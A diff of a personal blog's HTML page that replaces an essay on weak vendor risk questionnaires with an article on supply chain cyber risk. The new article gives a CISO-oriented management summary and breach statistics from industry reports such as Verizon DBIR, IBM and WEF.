@@ -1,283 +1,586 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Why Your Vendor Risk Program Misses the Point — Gabriel Hasik</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com"/>
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;0,900;1,700&family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
-  <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    :root {
-      --bg:        #0e0e0e;
-      --bg2:       #141414;
-      --bg3:       #1a1a1a;
-      --border:    #242424;
-      --muted:     #3a3a3a;
-      --text-dim:  #666;
-      --text-mid:  #999;
-      --text:      #d8d0c4;
-      --text-hi:   #f0e8dc;
-      --accent:    #d4821a;
-      --accent2:   #e8a84c;
-      --accent-dim:#3a2208;
-      --serif:     'Playfair Display', Georgia, serif;
-      --mono:      'DM Mono', 'Courier New', monospace;
-      --sans:      'DM Sans', system-ui, sans-serif;
-    }
-    html { scroll-behavior: smooth; }
-    body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: var(--sans);
-      font-weight: 300;
-      line-height: 1.7;
-      overflow-x: hidden;
-    }
-    body::before {
-      content: '';
-      position: fixed; inset: 0;
-      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
-      pointer-events: none; z-index: 9999; opacity: 0.35;
-    }
-    ::-webkit-scrollbar { width: 3px; }
-    ::-webkit-scrollbar-track { background: var(--bg); }
-    ::-webkit-scrollbar-thumb { background: var(--accent-dim); }
+<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"/> <meta name="viewport" content="width=device-width, initial-scale=1.0"/> <title>The Supply Chain Is Now the Biggest Cyber Threat — Gabriel Hasik</title> <link rel="preconnect" href="https://fonts.googleapis.com"/> <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,900;1,700&family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/> <style> *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; } :root { --bg: #0e0e0e; --bg2: #141414; --bg3: #1a1a1a; --border: #242424; --muted: #3a3a3a; --text-dim: #666; --text-mid: #999; --text: #d8d0c4; --text-hi: #f0e8dc; --accent: #d4821a; --accent2: #e8a84c; --accent-dim:#3a2208; --serif: 'Playfair Display', Georgia, serif; --mono: 'DM Mono', 'Courier New', monospace; --sans: 'DM Sans', system-ui, sans-serif; } html { scroll-behavior: smooth; } body { background: var(--bg); color: var(--text); font-family: var(--sans); font-weight: 300; line-height: 1.7; overflow-x: hidden; } body::before { content: ''; position: fixed; inset: 0; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E"); pointer-events: none; z-index: 9999; opacity: 0.35; } ::-webkit-scrollbar { width: 3px; } ::-webkit-scrollbar-track { background: var(--bg); } ::-webkit-scrollbar-thumb { background: var(--accent-dim); } nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; display: flex; align-items: center; justify-content: space-between; padding: 1.25rem 3rem; background: var(--bg); border-bottom: 1px solid var(--border); backdrop-filter: blur(8px); } .nav-logo { font-family: var(--serif); font-size: 1.1rem; font-weight: 700; color: var(--text-hi); text-decoration: none; letter-spacing: 0.02em; } .nav-logo span { color: var(--accent); } .nav-links { display: flex; gap: 2.5rem; list-style: none; } .nav-links a { font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--text-dim); text-decoration: none; transition: color 0.2s; } .nav-links a:hover { color: var(--accent); } .article-hero { padding: 9rem 3rem 4rem; border-bottom: 1px solid var(--border); max-width: 860px; } .back-link { display: inline-flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.15em; text-transform: uppercase; color: var(--text-dim); text-decoration: none; transition: color 0.2s; margin-bottom: 2.5rem; } .back-link:hover { color: var(--accent); } .back-link::before { content: '←'; } .article-cat { font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--accent); border: 1px solid var(--accent-dim); padding: 3px 10px; border-radius: 2px; display: inline-block; margin-bottom: 1.5rem; } .article-title { font-family: var(--serif); font-size: clamp(2rem, 5vw, 3.2rem); font-weight: 700; color: var(--text-hi); line-height: 1.15; letter-spacing: -0.02em; margin-bottom: 1.5rem; } .article-meta { font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--text-dim); display: flex; align-items: center; gap: 1.5rem; } .article-meta .sep { color: var(--muted); } .article-body { max-width: 720px; padding: 4rem 3rem 5rem; } .article-body p { font-size: 1.05rem; color: var(--text); margin-bottom: 1.5rem; line-height: 1.85; } .article-body h2 { font-family: var(--serif); font-size: clamp(1.4rem, 3vw, 1.9rem); font-weight: 700; color: var(--text-hi); line-height: 1.2; margin: 3rem 0 1rem; letter-spacing: -0.01em; } .article-body h3 { font-family: var(--serif); font-size: 1.2rem; font-weight: 700; color: var(--text-hi); margin: 2rem 0 0.75rem; } .article-body h4 { font-family: var(--sans); font-size: 1.05rem; font-weight: 500; color: var(--text-hi); margin: 1.5rem 0 0.5rem; } .article-body ul, .article-body ol { margin: 1rem 0 1.5rem 1.5rem; color: var(--text); } .article-body li { margin-bottom: 0.5rem; font-size: 1rem; line-height: 1.75; } .article-body strong { color: var(--text-hi); font-weight: 500; } .article-body em { color: var(--accent2); font-style: italic; } .article-body code { font-family: var(--mono); font-size: 0.85rem; background: var(--bg3); border: 1px solid var(--border); padding: 1px 6px; border-radius: 2px; color: var(--accent2); } .article-body pre { background: var(--bg3); border: 1px solid var(--border); padding: 1.25rem 1.5rem; border-radius: 3px; overflow-x: auto; margin: 1.5rem 0; } .article-body pre code { background: none; border: none; padding: 0; font-size: 0.82rem; line-height: 1.7; color: var(--accent2); } .article-body blockquote { border-left: 2px solid var(--accent); padding: 0.5rem 0 0.5rem 1.5rem; margin: 2rem 0; color: var(--text-mid); font-style: italic; } .article-body blockquote p { margin-bottom: 0; color: var(--text-mid); } .article-body a { color: var(--accent2); text-decoration: underline; text-underline-offset: 2px; transition: color 0.2s; } .article-body a:hover { color: var(--accent); } .article-divider { border: none; border-top: 1px solid var(--border); margin: 2.5rem 0; } .article-body table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; font-size: 0.9rem; } .article-body table th { font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--accent); text-align: left; padding: 0.6rem 0.75rem; border-bottom: 2px solid var(--accent-dim); background: var(--bg2); } .article-body table td { padding: 0.6rem 0.75rem; border-bottom: 1px solid var(--border); color: var(--text); vertical-align: top; } .article-body table tr:hover td { background: var(--bg2); } .annex-label { font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.15em; text-transform: uppercase; color: var(--accent); border: 1px solid var(--accent-dim); padding: 3px 10px; border-radius: 2px; display: inline-block; margin-bottom: 1rem; } .back-link-bottom { display: inline-flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.15em; text-transform: uppercase; color: var(--text-dim); text-decoration: none; transition: color 0.2s; margin-top: 2rem; } .back-link-bottom:hover { color: var(--accent); } .back-link-bottom::before { content: '←'; } footer { padding: 2.5rem 3rem; display: flex; align-items: center; justify-content: space-between; font-family: var(--mono); font-size: 0.65rem; letter-spacing: 0.12em; color: var(--muted); text-transform: uppercase; border-top: 1px solid var(--border); } footer a { color: var(--accent); text-decoration: none; } @media (max-width: 768px) { nav { padding: 1rem 1.5rem; } .nav-links { gap: 1.5rem; } .article-hero { padding: 7rem 1.5rem 3rem; } .article-body { padding: 3rem 1.5rem 4rem; } .article-body table { font-size: 0.8rem; } .article-body table th, .article-body table td { padding: 0.4rem 0.5rem; } footer { flex-direction: column; gap: 0.75rem; text-align: center; } } </style> </head> <body>
+<nav> <a class="nav-logo" href="index.html">G.<span>Hasik</span></a> <ul class="nav-links"> <li><a href="index.html#about">About</a></li> <li><a href="index.html#blog">Writing</a></li> <li><a href="index.html#projects">Projects</a></li> <li><a href="index.html#contact">Contact</a></li> </ul> </nav>
+<div class="article-hero"> <a class="back-link" href="index.html#blog">Back to Writing</a> <div class="article-cat">Supply Chain Cyber Risk</div> <h1 class="article-title">The Supply Chain Is Now the Biggest Cyber Threat — Here's What the Numbers Say</h1> <div class="article-meta"> <span>April 2026</span> <span class="sep">·</span> <span>45 min read</span> <span class="sep">·</span> <span>Gabriel Hasik</span> </div> </div>
+<div class="article-body">
+<!-- ============================================================ -->
+<!-- MANAGEMENT SUMMARY                                           -->
+<!-- ============================================================ -->
 
-    /* NAV */
-    nav {
-      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
-      display: flex; align-items: center; justify-content: space-between;
-      padding: 1.25rem 3rem;
-      background: var(--bg);
-      border-bottom: 1px solid var(--border);
-      backdrop-filter: blur(8px);
-    }
-    .nav-logo {
-      font-family: var(--serif); font-size: 1.1rem; font-weight: 700;
-      color: var(--text-hi); text-decoration: none; letter-spacing: 0.02em;
-    }
-    .nav-logo span { color: var(--accent); }
-    .nav-links { display: flex; gap: 2.5rem; list-style: none; }
-    .nav-links a {
-      font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.12em;
-      text-transform: uppercase; color: var(--text-dim); text-decoration: none;
-      transition: color 0.2s;
-    }
-    .nav-links a:hover { color: var(--accent); }
+<h2>Management Summary</h2>
 
-    /* ARTICLE HERO */
-    .article-hero {
-      padding: 9rem 3rem 4rem;
-      border-bottom: 1px solid var(--border);
-      max-width: 860px;
-    }
-    .back-link {
-      display: inline-flex; align-items: center; gap: 0.5rem;
-      font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.15em;
-      text-transform: uppercase; color: var(--text-dim); text-decoration: none;
-      transition: color 0.2s; margin-bottom: 2.5rem;
-    }
-    .back-link:hover { color: var(--accent); }
-    .back-link::before { content: '←'; }
-    .article-cat {
-      font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.2em;
-      text-transform: uppercase; color: var(--accent);
-      border: 1px solid var(--accent-dim); padding: 3px 10px; border-radius: 2px;
-      display: inline-block; margin-bottom: 1.5rem;
-    }
-    .article-title {
-      font-family: var(--serif); font-size: clamp(2rem, 5vw, 3.2rem);
-      font-weight: 700; color: var(--text-hi); line-height: 1.15;
-      letter-spacing: -0.02em; margin-bottom: 1.5rem;
-    }
-    .article-meta {
-      font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.12em;
-      text-transform: uppercase; color: var(--text-dim);
-      display: flex; align-items: center; gap: 1.5rem;
-    }
-    .article-meta .sep { color: var(--muted); }
+<p>For security leaders, this is no longer a niche topic or a "third-party risk" substream. <strong>Supply chain security has become a core enterprise resilience issue.</strong> The most important change is not just the increase in attack volume — it is the <strong>amplification effect</strong>. A single compromised supplier, open-source library, MSP, SaaS integration, or CI/CD dependency can impact hundreds or thousands of downstream organizations at once.</p>
 
-    /* ARTICLE BODY */
-    .article-body {
-      max-width: 720px;
-      padding: 4rem 3rem 5rem;
-    }
-    .article-body p {
-      font-size: 1.05rem; color: var(--text); margin-bottom: 1.5rem;
-      line-height: 1.85;
-    }
-    .article-body p:first-of-type::first-letter {
-      font-family: var(--serif); font-size: 3.2rem; font-weight: 900;
-      color: var(--accent); float: left; line-height: 0.8;
-      margin: 0.1em 0.12em 0 0;
-    }
-    .article-body h2 {
-      font-family: var(--serif); font-size: clamp(1.4rem, 3vw, 1.9rem);
-      font-weight: 700; color: var(--text-hi); line-height: 1.2;
-      margin: 3rem 0 1rem; letter-spacing: -0.01em;
-    }
-    .article-body h3 {
-      font-family: var(--serif); font-size: 1.2rem; font-weight: 700;
-      color: var(--text-hi); margin: 2rem 0 0.75rem;
-    }
-    .article-body ul, .article-body ol {
-      margin: 1rem 0 1.5rem 1.5rem; color: var(--text);
-    }
-    .article-body li { margin-bottom: 0.5rem; font-size: 1rem; line-height: 1.75; }
-    .article-body strong { color: var(--text-hi); font-weight: 500; }
-    .article-body em { color: var(--accent2); font-style: italic; }
-    .article-body code {
-      font-family: var(--mono); font-size: 0.85rem; background: var(--bg3);
-      border: 1px solid var(--border); padding: 1px 6px; border-radius: 2px;
-      color: var(--accent2);
-    }
-    .article-body blockquote {
-      border-left: 2px solid var(--accent); padding: 0.5rem 0 0.5rem 1.5rem;
-      margin: 2rem 0; color: var(--text-mid); font-style: italic;
-    }
-    .article-body blockquote p { margin-bottom: 0; color: var(--text-mid); }
-    .review-note {
-      background: var(--bg3); border: 1px solid var(--accent-dim);
-      border-left: 3px solid var(--accent); padding: 0.75rem 1rem;
-      font-family: var(--mono); font-size: 0.75rem; color: var(--accent2);
-      margin: 1.5rem 0; border-radius: 2px;
-    }
-    .article-divider {
-      border: none; border-top: 1px solid var(--border); margin: 2.5rem 0;
-    }
-    .back-link-bottom {
-      display: inline-flex; align-items: center; gap: 0.5rem;
-      font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.15em;
-      text-transform: uppercase; color: var(--text-dim); text-decoration: none;
-      transition: color 0.2s; margin-top: 2rem;
-    }
-    .back-link-bottom:hover { color: var(--accent); }
-    .back-link-bottom::before { content: '←'; }
+<p>The numbers are now too large to ignore. The article's core data points point in the same direction: <strong>30% of confirmed breaches now involve a third-party or supply chain element</strong>, supply chain attacks have <strong>multiplied sharply since 2020</strong>, and organizations remain materially underprepared in the two areas that matter most: <strong>supply chain visibility</strong> and <strong>incident readiness with partners</strong>. In practice, this means many organizations can detect weaknesses inside their own perimeter faster than they can identify which suppliers, sub-processors, software components, and privileged external connections actually matter most.</p>
 
-    /* FOOTER */
-    footer {
-      padding: 2.5rem 3rem;
-      display: flex; align-items: center; justify-content: space-between;
-      font-family: var(--mono); font-size: 0.65rem; letter-spacing: 0.12em;
-      color: var(--muted); text-transform: uppercase;
-      border-top: 1px solid var(--border);
-    }
-    footer a { color: var(--accent); text-decoration: none; }
+<p>For a <strong>CISO or ISO</strong>, the strategic implication is clear: supply chain security should now be treated as a <strong>governance, architecture, and assurance discipline</strong>, not just as procurement due diligence. It spans vendor inventory, software transparency, access management, security clauses, threat monitoring, testing, and regulatory reporting. Boards and executive committees increasingly expect evidence that management understands not just who the critical suppliers are, but also:</p>
 
-    @media (max-width: 768px) {
-      nav { padding: 1rem 1.5rem; }
-      .nav-links { gap: 1.5rem; }
-      .article-hero { padding: 7rem 1.5rem 3rem; }
-      .article-body { padding: 3rem 1.5rem 4rem; }
-      footer { flex-direction: column; gap: 0.75rem; text-align: center; }
-    }
-  </style>
-</head>
-<body>
+<ul>
+  <li>which third parties support critical business services,</li>
+  <li>which suppliers have privileged access or single-point-of-failure status,</li>
+  <li>which software components enter production through CI/CD pipelines,</li>
+  <li>how incidents will be detected, escalated, and reported when the failure originates outside the company.</li>
+</ul>
 
-  <!-- NAV -->
-  <nav>
-    <a class="nav-logo" href="index.html">G.<span>Hasik</span></a>
-    <ul class="nav-links">
-      <li><a href="index.html#about">About</a></li>
-      <li><a href="index.html#blog">Writing</a></li>
-      <li><a href="index.html#projects">Projects</a></li>
-      <li><a href="index.html#contact">Contact</a></li>
-    </ul>
-  </nav>
+<p>Regulation is pushing in the same direction. <strong>NIS2, DORA, ISO 27001:2022, and NIST CSF 2.0</strong> all now treat supply chain security as an explicit control domain. The common expectation across all of them is consistent:</p>
 
-  <!-- ARTICLE HERO -->
-  <div class="article-hero">
-    <a class="back-link" href="index.html#blog">Back to Writing</a>
-    <div class="article-cat">Supply Chain</div>
-    <h1 class="article-title">Why Your Vendor Risk Program Misses the Point</h1>
-    <div class="article-meta">
-      <span>March 2025</span>
-      <span class="sep">·</span>
-      <span>8 min read</span>
-      <span class="sep">·</span>
-      <span>Gabriel Hasik</span>
-    </div>
-  </div>
+<ol>
+  <li><strong>Know your dependencies</strong></li>
+  <li><strong>Apply risk-based due diligence and contractual controls</strong></li>
+  <li><strong>Monitor suppliers continuously, not annually</strong></li>
+  <li><strong>Control and segment third-party access</strong></li>
+  <li><strong>Prepare to detect, report, and contain supply chain incidents fast</strong></li>
+</ol>
 
-  <!-- ARTICLE BODY -->
-  <div class="article-body">
+<p>The practical leadership takeaway is straightforward. The most defensible near-term program consists of five moves:</p>
 
-    <p>Most vendor risk programs share a common architecture: a questionnaire sent annually, responses filed in a spreadsheet or GRC tool, a risk rating assigned, and a checkbox ticked confirming "vendor assessed." Leadership sees a completion rate. Auditors see evidence. Nobody sees actual risk.</p>
+<ul>
+  <li><strong>Map critical suppliers, software, and external access paths</strong></li>
+  <li><strong>Implement SBOM-driven visibility for internally built and vendor-supplied software</strong></li>
+  <li><strong>Replace point-in-time vendor assessments with continuous monitoring</strong></li>
+  <li><strong>Apply zero trust principles to vendor access, especially MFA, JIT access, PAM, and segmentation</strong></li>
+  <li><strong>Run supply chain incident scenarios with legal, procurement, IT, and critical suppliers</strong></li>
+</ul>
 
-    <p>This is the central dysfunction of third-party risk management as it's practiced today. The program exists to demonstrate compliance with a framework — SOC 2, ISO 27001, NIST CSF, take your pick — rather than to develop genuine intelligence about the organisations that underpin your operations. The output is documentation. The outcome is comfort. Neither is the same as security.</p>
+<p>Organizations that do these five things will not eliminate supply chain risk. But they will materially improve their ability to <strong>prioritize the right suppliers, reduce blast radius, produce audit evidence, and meet reporting timelines</strong> when a crisis hits.</p>
 
-    <p>After years of building and stress-testing TPRM programs, I've come to a simple conclusion: the programs that work treat vendor risk as an <em>intelligence function</em>, not an administrative one. The ones that don't are sophisticated ways of not knowing what you don't know.</p>
+<hr class="article-divider"/>
 
-    <h2>The Questionnaire Illusion</h2>
+<!-- ============================================================ -->
+<!-- SECTION 1 — THE NUMBERS                                      -->
+<!-- ============================================================ -->
 
-    <p>The annual security questionnaire is the backbone of most TPRM programs. It is also one of the least reliable signals of actual vendor security posture available to you. Not because vendors lie — though they do, sometimes — but because the questionnaire measures what vendors say they do, at a point in time, filtered through whoever fills it out.</p>
+<h2>1. The Numbers Tell an Unmistakable Story</h2>
 
-    <p>The person completing your questionnaire is probably not the person who runs your vendor's security program. They're someone in procurement, legal, or a junior analyst who's been handed a template. They're answering questions like "Do you have a patch management policy?" with "Yes" because there is, somewhere, a document that says so. Whether that policy is enforced, whether it covers the systems relevant to your integration, whether it was last reviewed in 2019 — none of that surfaces.</p>
+<h3>The big picture</h3>
 
-    <div class="review-note">[GABRIEL TO REVIEW] — Add a specific example or anecdote here: a real scenario where a questionnaire response gave false assurance before an incident or assessment finding.</div>
+<p>The trend is no longer debatable: supply chain attacks are not rare exceptions anymore. They are now one of the <strong>main ways organizations get breached</strong>. The business significance is that the risk is harder to see, harder to control directly, and often spreads far beyond the original victim.</p>
 
-    <p>Worse, questionnaires are static. A vendor that scores well in January may have suffered a breach, changed security leadership, or undergone a major infrastructure migration by the time you're thinking about them again. Your documentation shows "low risk." Your exposure may have changed materially.</p>
+<h3>Breach volume and growth rates</h3>
 
-    <p>This doesn't mean questionnaires have no value. They establish a baseline, create accountability, and sometimes surface genuine gaps. But treating them as the primary — and only — source of truth about vendor security posture is a category error.</p>
+<p>The acceleration is staggering. The Verizon 2025 DBIR, analyzing <strong>22,052 security incidents and 12,195 confirmed breaches</strong> across 139 countries, recorded the highest-ever proportion of third-party involvement at <strong>30%</strong>. IBM's X-Force 2026 report showed vulnerability exploitation became the <strong>#1 initial attack vector at 40% of all incidents</strong> (up from credential abuse), driven largely by supply chain targeting. Group-IB's 2026 High-Tech Crime Trends Report (<a href="<https://www.group-ib.com/media-center/press-releases/htct-2026-supply-chain/>">source</a>) declared supply chain attacks <strong>"the dominant force reshaping the global cyber threat landscape,"</strong> noting cybercrime shifted "decisively away from isolated intrusions toward ecosystem-wide compromise."</p>
 
-    <h2>Risk Tiering Without Substance</h2>
+<p>Black Kite's 2026 Third-Party Breach Report covers 2025 incidents and provides the most granular picture: <strong>136 verified major breach events</strong> produced <strong>719 publicly named victim companies</strong> plus an estimated <strong>~26,000 additional impacted organizations</strong> — a hidden "shadow layer" that never surfaces publicly. The downstream amplification ratio hit <strong>5.28 victims per breach event</strong>, a <strong>106% increase</strong> from 2024's ratio of 2.56. Supply chain attacks averaged <strong>26 incidents per month</strong> from April 2025, double the ~13/month rate in early 2024, with October 2025 setting a record of <strong>41 attacks</strong> in a single month (<a href="<https://cyble.com/blog/supply-chain-attacks-double-in-2025/>">Cyble</a>).</p>
 
-    <p>The second structural problem is how organisations tier vendors. The typical approach: high/medium/low based on data sensitivity and business criticality. Critical vendors get more scrutiny. Tier 3 vendors get a lighter-touch questionnaire. This logic is sound in theory and broken in practice.</p>
+<p>Sonatype's 2024 State of the Software Supply Chain Report (<a href="<https://www.sonatype.com/state-of-the-software-supply-chain/2024/10-year-look>">source</a>) found <strong>512,847 malicious open-source packages</strong> in a single year — a <strong>156% year-over-year increase</strong>. ReversingLabs documented a <strong>1,300% growth</strong> in repository-based malware threats between 2020 and 2023. Cybersecurity Ventures (<a href="<https://cybersecurityventures.com/software-supply-chain-attacks-to-cost-the-world-60-billion-by-2025/>">source</a>) projects global software supply chain attack costs rising from <strong>$46 billion (2023) to $60 billion (2025) to $138 billion by 2031</strong>.</p>
 
-    <p>The problem is that tiering is usually done at onboarding and rarely revisited. A vendor that started as Tier 2 — moderate data access, non-critical processes — can become deeply embedded in your operations over time. Systems get integrated. Dependencies form. An outage that would have been a nuisance two years ago is now a critical incident.</p>
+<p>The practical message is not just that "more attacks are happening." It is that <strong>one attack now affects many more organizations</strong> than before. A compromise no longer stops at the first victim.</p>
 
-    <p>Tiering also systematically underweights what I'd call <em>operational criticality</em> versus data criticality. Security teams naturally focus on who has access to sensitive data. But the vendor whose SaaS platform your operations team uses every day — no PII, limited data exposure — is more operationally critical than the vendor holding HR records in a segregated, encrypted environment. When they go down, your business goes down. That's a risk that most tiering models fail to capture adequately.</p>
+<h3>Financial impact and dwell time</h3>
 
-    <div class="review-note">[GABRIEL TO REVIEW] — Consider adding a specific tiering framework variant you've used or seen that does this better. Even a rough scoring matrix reference would strengthen this section.</div>
+<p>IBM's Cost of a Data Breach Report 2025 (<a href="<https://www.ibm.com/reports/data-breach>">source</a>) (Ponemon Institute, 600 organizations, 17 industries, 16 countries) established that <strong>supply chain breaches cost an average of $4.91 million</strong> — second-highest of any attack vector and well above the global average of $4.44 million. More critically, supply chain compromises take the <strong>longest to resolve at 267 days</strong> (71 days to identify + 196 days to contain) — exceeding malicious insiders (260 days) and all other vectors. Breaches exceeding 200 days cost <strong>$5.01 million versus $3.87 million</strong> for those resolved faster, a 29% premium. Black Kite found the <strong>median detection time for third-party breaches was just 10 days</strong>, but the <strong>median disclosure delay was 73 days</strong> (average 117 days) — a silent window that cascades risk downstream before anyone knows.</p>
 
-    <h2>The Compliance Mindset vs. the Intelligence Mindset</h2>
+<p>The most relevant executive implications are:</p>
 
-    <p>Here's the fundamental tension: compliance-oriented TPRM is designed to produce evidence that satisfies an auditor. Intelligence-oriented TPRM is designed to produce decisions that reduce actual exposure. These goals occasionally overlap. They're not the same thing.</p>
+<ul>
+  <li><strong>average supply chain breach cost is materially above the global breach average</strong>,</li>
+  <li><strong>containment takes longer than for most other breach types</strong>,</li>
+  <li>delayed supplier disclosure creates a dangerous "silent window" in which customers remain exposed without knowing it,</li>
+  <li>longer breaches almost always cost more.</li>
+</ul>
 
-    <p>A compliance mindset asks: "Do we have documentation showing this vendor was assessed?" An intelligence mindset asks: "What do we actually know about this vendor's security posture right now, and does that knowledge change how we operate?"</p>
+<p>For leadership teams, the lesson is important: the cost driver is not only the initial compromise. It is the combination of:</p>
 
-    <p>The practical difference shows up in resource allocation. Compliance programs allocate effort proportionally to vendor tier and audit requirements. Intelligence programs allocate effort based on what would most change your understanding of risk — which often means paying attention to signals that don't show up in questionnaires at all.</p>
+<ul>
+  <li>delayed visibility,</li>
+  <li>cross-company coordination,</li>
+  <li>regulatory reporting pressure,</li>
+  <li>contractual fallout,</li>
+  <li>and prolonged business disruption.</li>
+</ul>
 
-    <p>Those signals include: changes in vendor leadership or ownership, breach news and CVE disclosures, OSINT on exposed infrastructure, threat intelligence about campaigns targeting your vendor's sector, and changes in vendor financial health. None of these are captured in a point-in-time questionnaire. All of them are relevant to your actual exposure.</p>
+<h3>What the major reports say</h3>
 
-    <h2>What an Intelligence-Oriented Program Looks Like</h2>
+<p>The <strong>WEF Global Cybersecurity Outlook 2025</strong> (<a href="<https://www.weforum.org/publications/global-cybersecurity-outlook-2025/digest/>">source</a>) found <strong>54% of large organizations</strong> cite supply chain challenges as their biggest barrier to cyber resilience. Its 2026 edition (<a href="<https://www.weforum.org/publications/global-cybersecurity-outlook-2026/digest/>">source</a>) (804 participants, 92 countries) showed <strong>65% of respondents</strong> report supply chain disruption risks increasing, while only <strong>27% simulate cyber incidents with supply chain partners</strong> and only <strong>33% comprehensively map their supply chain ecosystems</strong>. CISOs ranked supply chain disruption as the <strong>#2 concern</strong> in both editions.</p>
 
-    <p>Rebuilding TPRM as an intelligence function doesn't require a larger budget — it requires a different allocation of the budget you have. A few structural changes make an outsized difference:</p>
+<p>The IBM X-Force 2026 report highlighted a <strong>49% increase in active ransomware/extortion groups</strong> (109 in 2025, up from 73 in 2024) and found <strong>56% of disclosed vulnerabilities</strong> required no authentication to exploit — meaning attackers can breach supply chain components without credentials. Manufacturing remained the most-targeted industry for the <strong>fifth consecutive year at 27.7%</strong> of incidents.</p>
 
-    <p><strong>Continuous monitoring over periodic assessment.</strong> Replace the annual questionnaire cycle with ongoing signal monitoring for your Tier 1 vendors. This means watching breach databases, CVE feeds, news monitoring, and basic OSINT on exposed infrastructure. The goal isn't to monitor everything — it's to maintain situational awareness on the vendors where a surprise would hurt most.</p>
+<p>Gartner's 2025 Market Guide reported <strong>60% of large enterprises</strong> already deploying software supply chain security tools, projecting <strong>85% by 2028</strong>.</p>
 
-    <p><strong>Treat vendor risk data as a feed, not a record.</strong> Most GRC tools are designed to store and retrieve static records. That's fine for compliance evidence. It's inadequate for risk intelligence. The data you care about is dynamic — it changes as vendors change. Build processes that treat vendor risk as a live feed rather than a filed document.</p>
+<table>
+  <thead>
+    <tr><th>Metric</th><th>Value</th><th>Source</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Third-party involvement in all breaches</td><td><strong>30%</strong> (doubled YoY)</td><td>Verizon DBIR 2025</td></tr>
+    <tr><td>Average supply chain breach cost</td><td><strong>$4.91M</strong></td><td>IBM Cost of Data Breach 2025</td></tr>
+    <tr><td>Supply chain breach lifecycle</td><td><strong>267 days</strong></td><td>IBM Cost of Data Breach 2025</td></tr>
+    <tr><td>Individuals affected by third-party breaches (2025)</td><td><strong>433 million</strong></td><td>Black Kite 2026</td></tr>
+    <tr><td>Downstream victims per breach event</td><td><strong>5.28</strong> (up 106%)</td><td>Black Kite 2026</td></tr>
+    <tr><td>Large orgs citing supply chain as top barrier</td><td><strong>54%</strong></td><td>WEF GCO 2025</td></tr>
+    <tr><td>Orgs that map their supply chain ecosystems</td><td><strong>33%</strong></td><td>WEF GCO 2026</td></tr>
+    <tr><td>Malicious open-source packages (1 year)</td><td><strong>512,847</strong> (up 156%)</td><td>Sonatype 2024</td></tr>
+    <tr><td>Projected supply chain attack costs (2025)</td><td><strong>$60 billion</strong></td><td>Cybersecurity Ventures</td></tr>
+  </tbody>
+</table>
 
-    <p><strong>Integrate with procurement and architecture decisions.</strong> Vendor risk teams typically find out about new vendor relationships after the contract is signed. By then, the leverage to negotiate security requirements is largely gone. Getting upstream — into the architecture and procurement conversations — is where TPRM can genuinely influence risk, not just document it.</p>
+<p>Taken together, the major cyber reports now describe the same problem from different angles:</p>
 
-    <div class="review-note">[GABRIEL TO REVIEW] — Add specific tooling or workflow details here. For example, how you've set up monitoring pipelines, which data sources have proven most signal-dense vs. noisy, and any specific numbers (e.g. how many Tier 1 vendors a monitoring setup like this is practical for).</div>
+<ul>
+  <li>security leaders see supply chain dependence as a major resilience barrier,</li>
+  <li>only a minority of organizations map their supplier ecosystem comprehensively,</li>
+  <li>even fewer exercise incident scenarios with suppliers,</li>
+  <li>attackers increasingly exploit no-auth vulnerabilities, OAuth trust, open-source ecosystems, and managed service relationships.</li>
+</ul>
 
-    <p><strong>Separate the evidence function from the intelligence function.</strong> The work of producing audit evidence and the work of developing risk intelligence are different activities. They can live in the same team, but they shouldn't be conflated. The person whose job is to ensure the questionnaire spreadsheet is up to date should not be the same function as the person thinking about what you actually know about your vendor estate.</p>
+<h3>Executive takeaway</h3>
 
-    <h2>The Honest Conversation Nobody Wants to Have</h2>
+<p>For management, the numbers justify a shift in focus:</p>
 
-    <p>Most TPRM programs exist because they're required — by regulators, by frameworks, by contract terms. The people building them often know they're not producing real intelligence. But the incentive structure rewards completion rates and audit readiness, not genuine risk reduction. This creates a situation where everyone is doing the right things for the wrong reasons, and the output is a program that looks robust but isn't.</p>
+<ul>
+  <li>from isolated vendor assessments to <strong>ecosystem risk management</strong>,</li>
+  <li>from compliance paperwork to <strong>operational readiness</strong>,</li>
+  <li>and from internal perimeter thinking to <strong>dependency-centric defense</strong>.</li>
+</ul>
 
